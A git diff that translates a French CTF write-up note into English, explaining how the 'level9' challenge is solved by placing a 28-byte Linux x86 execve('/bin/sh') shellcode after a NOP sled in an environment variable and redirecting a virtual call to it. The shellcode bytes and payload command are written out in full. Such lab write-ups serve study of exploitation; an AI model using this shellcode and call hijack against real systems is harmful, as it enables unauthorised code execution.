@@ -1,41 +1,41 @@
 # Shellcode (level9)
 
-**Voir aussi :** `shellcode_pas_a_pas.md` (explication instruction par instruction), `concepts.md` (chaîne d’exploit, NOP sled, layout).
+**See also:** `shellcode_pas_a_pas.md` (instruction-by-instruction explanation), `concepts.md` (exploit chain, NOP sled, layout).
 
-## Référence utilisée
+## Reference used
 
-Shellcode **Linux x86 execve("/bin/sh") — 28 bytes**  
-- **Auteur :** Jean Pascal Pereira \<pereira@secbiz.de\>  
-- **Source :** [shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html)  
-- **Web :** http://0xffe4.org  
+Shellcode **Linux x86 execve("/bin/sh") — 28 bytes**
+- **Author:** Jean Pascal Pereira \<pereira@secbiz.de\>
+- **Source:** [shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html)
+- **Web:** http://0xffe4.org
 
-Octets utilisés :
+Bytes used:
 ```c
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 ```
-Aucune chaîne "/bin/sh" à concaténer : le shellcode construit "/bin//sh" sur la pile (push).
+No "/bin/sh" string to concatenate: the shellcode builds "/bin//sh" on the stack (push).
 
 ## Concept
-Un **shellcode** est du code machine injecté (souvent execve("/bin/sh")). Comme le binaire level9 n’a pas `system` ni "/bin/sh", on exécute du code externe.
+A **shellcode** is injected machine code (often execve("/bin/sh")). Since the level9 binary has no `system` nor "/bin/sh", we run external code.
 
-## Où ça apparaît (level9)
-- L’appel virtuel saute vers *(second->vptr) = *(premier+4). On met à **premier+4** l’adresse du shellcode (4 premiers octets du payload).
-- Le shellcode est dans **env** : `env -i payload=$(python -c 'print "\x90"*1000 + "<shellcode>"')`.
-- Nopsled (1000×\x90) pour faciliter l’atteinte ; l’adresse (ex. 0xbffffc63) se trouve en GDB avec `x/200s environ`.
+## Where it appears (level9)
+- The virtual call jumps to *(second->vptr) = *(first+4). We put at **first+4** the shellcode address (first 4 bytes of the payload).
+- The shellcode is in **env**: `env -i payload=$(python -c 'print "\x90"*1000 + "<shellcode>"')`.
+- Nopsled (1000×\x90) to make hitting it easier; the address (e.g. 0xbffffc63) is found in GDB with `x/200s environ`.
 
-## Flux
+## Flow
 
 ```
-  call edx   (edx = *(premier+4) = adresse shellcode)
+  call edx   (edx = *(first+4) = shellcode address)
       ↓
   nopsled → shellcode execve("/bin/sh")
       ↓
   shell
 ```
 
-## Résumé mental
-Pas de gadget “system” dans le binaire → on injecte du code (shellcode) dans l’env et on détourne l’appel virtuel vers cette adresse.
+## Mental summary
+No "system" gadget in the binary → we inject code (shellcode) in the env and hijack the virtual call to that address.
 
-## Références
-- Shellcode 811 : https://shell-storm.org/shellcode/files/shellcode-811.html  
-- `execve(2)` : https://man7.org/linux/man-pages/man2/execve.2.html
+## References
+- Shellcode 811: https://shell-storm.org/shellcode/files/shellcode-811.html
+- `execve(2)`: https://man7.org/linux/man-pages/man2/execve.2.html
